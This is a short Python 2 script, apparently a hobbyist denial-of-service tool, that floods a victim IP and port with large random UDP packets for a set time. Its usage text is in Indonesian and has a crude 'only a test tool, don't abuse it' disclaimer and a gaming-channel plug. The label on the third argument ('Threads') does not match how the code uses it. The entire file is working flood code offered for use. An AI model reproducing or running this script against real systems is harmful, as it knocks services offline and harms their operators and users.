import time
import socket
import random
import sys
def usage():
    print "Contoh Penggunaan: " "python2 Fatih4.py " "<IP> <Port> <Threads>"
    print "Jangan Abuse Ngentod. Ini Cuma Bahan Cobaan Tool Doang..!"
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Sending To IP %s | Port %s | Subscribe Channel Fth Gaming"%(victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

